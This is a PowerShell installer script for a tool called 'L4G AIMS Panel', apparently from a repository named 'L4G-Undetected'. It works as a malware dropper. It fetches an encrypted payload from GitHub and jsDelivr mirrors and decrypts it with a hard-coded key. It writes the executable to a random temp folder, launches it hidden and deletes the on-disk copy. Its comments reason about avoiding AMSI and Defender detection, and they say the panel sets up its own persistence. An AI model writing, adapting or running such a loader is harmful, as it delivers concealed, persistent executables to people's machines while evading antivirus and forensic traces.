<#
.SYNOPSIS
    L4G AIMS Panel - Installer
.DESCRIPTION
    Fetches the encrypted panel, decrypts it in memory, drops it to a random temp
    path, starts it hidden and removes the on-disk copy. The panel installs its own
    persistence, so the installer stays small and disposable.

    No Add-Type, no in-PowerShell PE mapping: the payload is already a native EXE,
    and a half-mapped image resumed into rundll32's entry point was never going to
    run the panel anyway (no SetThreadContext, no relocations, no imports).
.PARAMETER PayloadPath
    Local payload file (base64). Skips the download; used to test the installer
    without a published repo.
.PARAMETER NoLaunch
    Decrypt and verify only. Nothing is executed.
.PARAMETER KeepFile
    Do not delete the dropped executable (debugging).
.NOTES
    Author: L4G Team
    Version: 14.1

    AMSI note: no bypass lives in this file, and none should be added. AMSI scans
    the entire script text before execution, so an in-script bypass is scanned too
    and only marks the file. The installer stays a plain fetch/decrypt/start.
#>

param(
    [string]$PayloadPath = "",
    [string]$MasterKey   = "L4G-Master-Key-32-Chars-Long!!",
    [switch]$NoLaunch,
    [switch]$KeepFile
)

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = 'Stop'

# Test hook: L4G_DRYRUN=1 decrypts and verifies without starting the panel.
if ($env:L4G_DRYRUN -eq '1') { $NoLaunch = $true }

$SOURCES = @(
    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer",
    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/main/installer",
    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@master/installer",
    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@main/installer"
)

# No AMSI/ETW tampering here on purpose. AMSI scans the whole script block before
# the first line runs, so an in-script bypass only hands the scanner a signature
# and the file gets blocked as malicious before it can disarm anything. Measured:
# Defender -> Trojan:PowerShell/PsAttack.A on the previous version.

function Get-PayloadText {
    param([string]$LocalPath, [string[]]$Bases)

    if ($LocalPath) {
        if (-not (Test-Path $LocalPath)) { throw "payload not found: $LocalPath" }
        return [IO.File]::ReadAllText($LocalPath)
    }

    foreach ($base in $Bases) {
        try {
            $r = Invoke-WebRequest -Uri "$base/payload.dat" -UseBasicParsing -TimeoutSec 30
            if ($r.StatusCode -eq 200 -and $r.Content.Length -gt 64) { return $r.Content }
        } catch {}
    }
    throw "payload.dat unreachable from all sources"
}

function Unprotect-Payload {
    param([string]$Base64, [string]$Key)

    $blob = [Convert]::FromBase64String(($Base64 -replace '\s',''))
    if ($blob.Length -lt 33) { throw "payload too short: $($blob.Length) bytes" }

    $salt       = $blob[0..15]
    $iv         = $blob[16..31]
    $ciphertext = $blob[32..($blob.Length - 1)]

    $kdf = New-Object Security.Cryptography.Rfc2898DeriveBytes($Key, $salt, 100000)
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key     = $kdf.GetBytes(32)
    $aes.IV      = $iv
    $aes.Mode    = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7

    return $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
}

function Install-Panel {
    param([byte[]]$Image)

    if ($Image.Length -lt 0x40 -or $Image[0] -ne 0x4D -or $Image[1] -ne 0x5A) {
        throw "decrypted payload is not a PE image (no MZ header)"
    }

    # Drop beside the user's temp, in a randomly named folder.
    $dir = Join-Path $env:TEMP ("l4g_" + [Guid]::NewGuid().ToString('N').Substring(0,8))
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    $exe = Join-Path $dir ([Guid]::NewGuid().ToString('N').Substring(0,8) + ".exe")

    [IO.File]::WriteAllBytes($exe, $Image)

    if ($NoLaunch) {
        Write-Host "[L4G] -NoLaunch: wrote $($Image.Length) bytes to $exe" -ForegroundColor Yellow
        return $exe
    }

    Start-Process -FilePath $exe -WindowStyle Hidden | Out-Null
    Start-Sleep -Milliseconds 1500

    if (-not $KeepFile) {
        # The image is mapped; deleting the file leaves no on-disk copy.
        try { Remove-Item -LiteralPath $exe -Force } catch {}
        try {
            if (-not (Get-ChildItem -LiteralPath $dir -Force | Select-Object -First 1)) {
                Remove-Item -LiteralPath $dir -Force
            }
        } catch {}
    }

    return $exe
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

Write-Host "[L4G] L4G AIMS v14 - installer" -ForegroundColor Cyan

try {
    $payloadText = Get-PayloadText -LocalPath $PayloadPath -Bases $SOURCES
} catch {
    Write-Host "[L4G] Payload fetch failed: $_" -ForegroundColor Red
    exit 1
}

try {
    $image = Unprotect-Payload -Base64 $payloadText -Key $MasterKey
} catch {
    Write-Host "[L4G] Decryption failed: $_" -ForegroundColor Red
    exit 1
}

$sha = [Security.Cryptography.SHA256]::Create()
$hash = ([BitConverter]::ToString($sha.ComputeHash($image)) -replace '-','').Substring(0,16)
Write-Host "[L4G] Payload decrypted: $($image.Length) bytes  sha256:$hash" -ForegroundColor Green

try {
    $dropped = Install-Panel -Image $image
} catch {
    Write-Host "[L4G] Install failed: $_" -ForegroundColor Red
    exit 1
}

if (-not $NoLaunch) {
    Write-Host "[L4G] Panel started (detached, hidden). Installer exiting." -ForegroundColor Green
}

# Local trace cleanup: only our own files, never the machine's event logs.
try {
    Get-ChildItem "$env:USERPROFILE\AppData\Local\Temp" -Filter "l4g_*" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddMinutes(-5) } |
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
} catch {}
